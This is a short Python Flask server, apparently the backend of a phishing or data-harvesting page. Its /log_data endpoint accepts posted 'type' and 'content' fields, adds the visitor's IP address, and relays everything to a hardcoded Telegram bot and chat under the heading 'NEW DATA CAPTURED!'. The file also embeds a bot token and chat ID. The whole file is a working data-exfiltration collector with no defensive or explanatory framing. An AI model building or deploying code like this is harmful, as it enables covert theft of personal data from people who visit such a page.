import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

BOT_TOKEN = "7914848325:AAF0_A8IeN3Gz9n8T_S5Z9B1_U0Xz4_R_E"
CHAT_ID = "8215560049"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": message})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log_data', methods=['POST'])
def log_data():
    data = request.json
    data_type = data.get('type')
    content = data.get('content')
    
    msg = f"🛰️ NEW DATA CAPTURED!\n\nType: {data_type}\nContent: {content}\nIP: {request.remote_addr}"
    send_to_telegram(msg)
    return jsonify({"status": "received"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
